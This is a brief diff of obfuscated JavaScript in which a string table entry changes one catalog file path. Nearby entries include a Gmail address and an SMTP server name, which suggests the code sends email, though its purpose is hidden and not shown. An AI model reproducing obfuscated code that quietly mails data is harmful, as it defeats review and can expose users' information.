@@ -63,7 +63,7 @@ function _0x1735() {
         '835881hwqQIg',
         '684NEUtjA',
         '1178704jUVyYD',
-        '../../catalogs/IMRANC.js',
+        '../../catalogs/SAKIBC.js',
         'ryukodeveloper@gmail.com',
         '1970938sjJxFK',
         'smtp.gmail.com',
